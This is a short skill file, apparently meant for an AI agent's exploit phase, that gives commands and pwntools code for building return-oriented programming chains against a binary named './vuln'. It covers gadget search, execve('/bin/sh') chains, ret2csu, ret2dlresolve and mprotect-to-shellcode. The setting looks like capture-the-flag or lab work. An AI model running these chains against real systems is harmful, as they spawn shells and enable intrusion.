---
name: rop-chaining
when: stack control, need syscalls or multi-step chains (execve, mprotect, static binaries)
tools: [python_exec, shell]
phase: exploit
---
# ROP chaining

Find gadgets:
```
ROPgadget --binary ./vuln | grep -E 'pop rdi|pop rsi|pop rdx|syscall|ret'
ropper --file ./vuln --search 'pop rdi; ret'
```
Build with pwntools (it auto-solves simple chains):
```python
rop = ROP(elf)
rop.call('read', [0, elf.bss(0x100), 8]); rop.execve(elf.bss(0x100), 0, 0)   # if syms present
raw = rop.chain()
```
Manual execve syscall (static/no libc): set rax=59, rdi="/bin/sh", rsi=0, rdx=0, then `syscall`.
```python
frame = ''  # or hand-roll: p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(59)+p64(syscall)
```
Techniques:
- ret2csu when you lack `pop rdx` (use __libc_csu_init gadgets; `rop.ret2csu(...)`).
- ret2dlresolve when there is no libc leak and no useful imports: `from pwn import Ret2dlresolvePayload`.
- mprotect the stack RWX then jump to shellcode when you have a stack address.
Alignment: 64-bit glibc `system`/`do_system` needs 16-byte aligned rsp; prepend a `ret`.
